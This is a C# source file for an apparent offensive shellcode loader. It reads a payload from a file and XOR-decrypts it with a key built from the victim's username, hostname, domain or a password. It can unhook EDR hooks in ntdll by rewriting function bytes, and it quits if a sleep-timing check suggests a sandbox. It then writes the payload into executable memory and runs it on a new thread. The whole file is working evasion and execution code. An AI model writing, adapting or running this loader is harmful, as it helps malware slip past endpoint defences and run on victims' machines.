using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;

namespace ShellcodeLoader
{
    public class Imports
    {
        [DllImport("ntdll.dll", SetLastError = true)]
        public static extern uint NtProtectVirtualMemory(IntPtr ProcessHandle, ref IntPtr BaseAddress, ref UInt32 NumberOfBytesToProtect, UInt32 NewAccessProtection, ref UInt32 OldAccessProtection);
        [DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
        public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
        [DllImport("kernel32.dll")]
        public static extern void Sleep(uint dwMilliseconds);
        [DllImport("ntdll.dll", SetLastError = true)]
        public static extern uint NtAllocateVirtualMemory(IntPtr ProcessHandle, ref IntPtr BaseAddress, UInt32 ZeroBits, ref UInt32 RegionSize, UInt32 AllocationType, UInt32 Protect);
        [DllImport("kernel32", CharSet = CharSet.Ansi)]
        public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, ref IntPtr lpThreadId);
        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);
    }
    partial class Unhooker
    {
        static string[] functions =
        {
            "NtClose",
            "NtAllocateVirtualMemory",
            "NtAllocateVirtualMemoryEx",
            "NtCreateThread",
            "NtCreateThreadEx",
            "NtCreateUserProcess",
            "NtFreeVirtualMemory",
            "NtLoadDriver",
            "NtMapViewOfSection",
            "NtOpenProcess",
            "NtProtectVirtualMemory",
            "NtQueueApcThread",
            "NtQueueApcThreadEx",
            "NtResumeThread",
            "NtSetContextThread",
            "NtSetInformationProcess",
            "NtSuspendThread",
            "NtUnloadDriver",
            "NtWriteVirtualMemory"
        };
        static byte[] safeBytes = {
            0x4c, 0x8b, 0xd1, // mov r10, rcx
            0xb8              // mov eax, ??
        };

        private static bool check_safe_func(KeyValuePair<string, IntPtr> func)
        {
            byte[] instructions = new byte[4];
            Marshal.Copy(func.Value, instructions, 0, 4);
            string fmtFunc = string.Format("    {0,-25} 0x{1:X} ", func.Key, func.Value.ToInt64());

            if (instructions.SequenceEqual(safeBytes))
            {
                Console.WriteLine(fmtFunc + "- SAFE");
                return true;
            }
            else
            {
                byte[] hookInstructions = new byte[32];
                Marshal.Copy(func.Value, hookInstructions, 0, 32);
                Console.WriteLine(fmtFunc + " - HOOK DETECTED");
                Console.WriteLine("    {0,-25} {1}", "Instructions: ", BitConverter.ToString(hookInstructions).Replace("-", " "));
                return false;
            }
        }

        private unsafe static void unhook_func(KeyValuePair<string, IntPtr> func, Process proc)
        {
            try
            {
                byte* ptr = (byte*)func.Value;
                IntPtr addr = func.Value;
                uint size = 16;
                Console.Write("     |-> Remapping " + func.Key + ":");
                Console.Write(" ==> Making memory writable");

                uint oldProtect = 0;
                Imports.NtProtectVirtualMemory(
                    proc.Handle,
                    ref addr,
                    ref size,
                    0x40,
                    ref oldProtect
                );
                Console.Write(" ==> Rewriting original bytes");
                for (int i = 0; i < 4; i++)
                {
                    ptr[i] = safeBytes[i];
                }
                Console.Write(" ==> Restoring memory protection");
                Imports.NtProtectVirtualMemory(
                    proc.Handle,
                    ref addr,
                    ref size,
                    oldProtect,
                    ref oldProtect
                );
                Console.WriteLine(" ==> UNHOOKED!");
            }
            catch (Exception e)
            {
                Console.WriteLine(" ==> FAIL!");
                Console.WriteLine(e.Message);
                return;
            }
        }

        public static void Unhook()
        {
            Console.WriteLine("Checking hooking of ntdll.dll...");
            // Get the base address of ntdll.dll in our own process
            IntPtr ntdllBase = GetNTDLLBase();
            if (ntdllBase == IntPtr.Zero)
            {
                Console.WriteLine("[-] Couldn't find ntdll.dll");
                return;

            }
            else { Console.WriteLine("NTDLL Base Address: 0x{0:X}", ntdllBase.ToInt64()); }

            // Get the address of each of the target functions in ntdll.dll
            IDictionary<string, IntPtr> funcAddresses = GetFuncAddress(ntdllBase, functions);
            Process proc = Process.GetCurrentProcess();
            // Check the first DWORD at each function's address for proper SYSCALL setup
            Console.WriteLine("==============================================================");
            foreach (KeyValuePair<string, IntPtr> func in funcAddresses)
            {
                if (!check_safe_func(func))
                {
                    unhook_func(func, proc);
                    check_safe_func(func);
                }
            }
            Console.WriteLine("==============================================================");
        }

        static IntPtr GetNTDLLBase()
        {
            Process hProc = Process.GetCurrentProcess();
            ProcessModule module = hProc.Modules.Cast<ProcessModule>().SingleOrDefault(m => string.Equals(m.ModuleName, "ntdll.dll", StringComparison.OrdinalIgnoreCase));
            return module?.BaseAddress ?? IntPtr.Zero;
        }
        


        static IDictionary<string, IntPtr> GetFuncAddress(IntPtr hModule, string[] functions)
        {
            IDictionary<string, IntPtr> funcAddresses = new Dictionary<string, IntPtr>();
            foreach (string function in functions)
            {
                IntPtr funcPtr = Imports.GetProcAddress(hModule, function);

                if (funcPtr != IntPtr.Zero)
                {
                    funcAddresses.Add(function, funcPtr);
                }
                else
                {
                    Console.WriteLine("[-] Couldn't locate the address for {0}!", function);
                }
            }

            return funcAddresses;
        }
    }

    class Program
    {
        public static byte[] StringToByteArray(string hex)
        {
            byte[] outr = new byte[(hex.Length / 2) + 1];
            for (int i = 0; i < hex.Length; i += 2)
            {
                outr[i / 2] = Convert.ToByte(hex.Substring(i, 2), 16);
            }
            return outr;
        }

        public unsafe static void writeHexPayloadToMem(string hex, ref IntPtr addr)
        {
            byte* ptr = (byte*)addr;
            for (int i = 0; i < hex.Length; i += 2)
            {
                ptr[i / 2] = Convert.ToByte(hex.Substring(i, 2), 16);
            }
        }

        public unsafe static void writeBinPayloadToMem(byte[] payload, ref IntPtr addr)
        {
            byte* ptr = (byte*)addr;
            for (int i = 0; i < payload.Length; i++)
            {
                ptr[i] = payload[i];
            }
        }

        public unsafe static void decryptKeying(ref IntPtr addr, string key, UInt32 size)
        {
            byte[] keybytes = Encoding.ASCII.GetBytes(key);
            byte* ptr = (byte*)addr;
            for (int i = 0; i < size; i++)
            {
                ptr[i] = (byte)(ptr[i] ^ keybytes[i % keybytes.Length]);
            }
        }

        public enum KeyingMode
        {
            KEYING_NONE = 0,
            KEYING_PASSWORD = 1,
            KEYING_USERNAME = 2,
            KEYING_HOSTNAME = 3,
            KEYING_DOMAIN = 4
        }

        public static bool IsLOLZFormat(string filename)
        {
            byte[] buff = new byte[4];
            File.OpenRead(filename).Read(buff, 0, 4);
            return buff.SequenceEqual(Encoding.ASCII.GetBytes("LOLZ"));
        }

        public static byte[] LoadDonutFile(string filename)
        {
            if (!File.Exists(filename))
            {
                Console.Error.WriteLine("Filename does not exists: " + filename);
                return null;
            }
            try
            {
                byte[] content = File.ReadAllBytes(filename);
                return content;
            }
            catch (Exception e)
            {
                Console.Error.WriteLine("Cannot parse shellcode file.");
                Console.Error.WriteLine(e.Message);
            }
            return null;
        }

        public static string[] LoadLOLZFile(string filename)
        {
            if (!File.Exists(filename))
            {
                Console.Error.WriteLine("Filename does not exists: " + filename);
                return null;
            }
            try
            {
                string[] lines = File.ReadAllLines(filename, Encoding.UTF8);
                if (lines.Length != 2)
                {
                    Console.Error.WriteLine("Cannot parse shellcode file, wrong number of lines");
                    return null;
                }
                return new string[] { lines[0].Substring(4), lines[1] };
            }
            catch (Exception e)
            {
                Console.Error.WriteLine("Cannot parse shellcode file.");
                Console.Error.WriteLine(e.Message);
            }
            return null;
        }

        public static string GetKey(string mode, string password = null)
        {
            StringBuilder keybuilder = new StringBuilder();
            foreach (char c in mode)
            {
                KeyingMode m = (KeyingMode)int.Parse(c.ToString());
                switch (m)
                {
                    case KeyingMode.KEYING_NONE:
                        return null;
                    case KeyingMode.KEYING_USERNAME:
                        keybuilder.Append(Environment.UserName);
                        break;
                    case KeyingMode.KEYING_HOSTNAME:
                        keybuilder.Append(Environment.MachineName);
                        break;
                    case KeyingMode.KEYING_DOMAIN:
                        keybuilder.Append(Environment.UserDomainName);
                        break;
                    case KeyingMode.KEYING_PASSWORD:
                        if (password != null)
                        {
                            keybuilder.Append(password);
                        }
                        else
                        {
                            Console.Write("Password: ");
                            keybuilder.Append(Console.ReadLine().Trim(new[] { '\n', '\r', ' ', '\t' }));

                        }
                        break;
                }
            }
            return keybuilder.ToString();
        }

        public static void usage()
        {
            StringBuilder sb = new StringBuilder();
            sb.AppendLine("Usage: ShellcodeLoader.exe [-u] [-p password] [shellcode_file]");
            sb.AppendLine("\tshellcode_file\tfile containing the shellcode");
            sb.AppendLine("If <shellcode> is not specified, the program will search for \"shellcode.bin\" the current working directory.");
            sb.AppendLine("\t-p password\tif a password is required for the key, it will be read from this parameter instead of asking interactively");
            sb.AppendLine("\t-u\tdo API unhooking before loading the shellcode");
            Console.WriteLine(sb.ToString());
        }
        static int Main(string[] args)
        {
            // PARAMS
            string filename = null;
            bool unhook = false;
            string password = null;

            for (int i = 0; i < args.Length; i++)
            {
                switch (args[i])
                {
                    case "-u":
                        unhook = true;
                        break;
                    case "-p":
                        if (i + 1 >= args.Length)
                        {
                            usage();
                            return -1;
                        }
                        password = args[i + 1];
                        i++;
                        break;
                    default:
                        if (filename == null)
                        {
                            filename = args[i];
                        }
                        else
                        {
                            usage();
                            return -1;
                        }
                        break;
                }
            }

            if (filename == null)
            {
                if (File.Exists("shellcode.bin"))
                {
                    filename = "shellcode.bin";
                }
                else
                {
                    Console.Error.WriteLine("Please specify an input filename");
                    usage();
                    return 0;
                }
            }

            if (!File.Exists(filename))
            {
                Console.Error.WriteLine("Specified filename does not exist: " + filename);
                return -1;
            }

            // Load shellcode from file
            string key = null;
            string strpayload = null;
            byte[] binpayload = null;
            bool LOLZFormat = IsLOLZFormat(filename);
            UInt32 payloadSize = 0;
            if (LOLZFormat)
            {
                Console.WriteLine("Detected smart shellcode file");
                string[] content = LoadLOLZFile(filename);
                key = GetKey(content[0], password);
                strpayload = content[1];
                payloadSize = Convert.ToUInt32(strpayload.Length / 2);
            }
            else
            {
                Console.WriteLine("Detected standard file");
                binpayload = LoadDonutFile(filename);
                payloadSize = Convert.ToUInt32(binpayload.Length);
            }

            // Unhook
            if (unhook) Unhooker.Unhook();

            // Detect EDR
            DateTime t1 = DateTime.Now;
            Imports.Sleep(2000);
            double t2 = DateTime.Now.Subtract(t1).TotalSeconds;
            if (t2 < 1.5)
            {
                return 255;
            }


            // Encrypt: https://gchq.github.io/CyberChef/#recipe=From_Hex('Auto')XOR(%7B'option':'UTF8','string':'GMT'%7D,'Standard',false)To_Hex('None',0)
            // Allocate memory
            if (key == null)
            {
                Console.WriteLine("Shellcode not keyed.");
            }
            else
            {
                Console.WriteLine("Generated XOR key: " + key);
            }
            Console.WriteLine("Allocating memory, payload length: " + payloadSize);
            object[] valloc_parameters = new object[]
            {
                IntPtr.Zero,
                payloadSize,
                (uint)0x3000,
                (uint)0x40
            };

            IntPtr addr = IntPtr.Zero;
            uint region_size = payloadSize;
            Imports.NtAllocateVirtualMemory((IntPtr)(-1), ref addr, 0, ref region_size, (uint)0x3000, (uint)0x40);

            if (addr == IntPtr.Zero)
            {
                Console.Error.WriteLine("Allocation failed :(");
                return 255;
            }
            else
            {
                Console.WriteLine("Allocation successful!");
            }

            // Write shellcode into memory
            if (LOLZFormat)
            {
                writeHexPayloadToMem(strpayload, ref addr);
            }
            else
            {
                writeBinPayloadToMem(binpayload, ref addr);
            }

            // Decrypt shellcode
            if (key != null)
            {
                decryptKeying(ref addr, key, payloadSize);
            }

            // Launch
            Console.WriteLine("Starting thread.");
            IntPtr threadId = IntPtr.Zero;
            IntPtr hThread = Imports.CreateThread(
                IntPtr.Zero,
                0,
                addr,
                IntPtr.Zero,
                0,
                ref threadId
                );

            Console.WriteLine("Executing shellcode now!");
            Console.WriteLine();
            Imports.WaitForSingleObject(hThread, UInt32.MaxValue);
            Console.WriteLine("DONE!");
            return 0;
        }
    }
}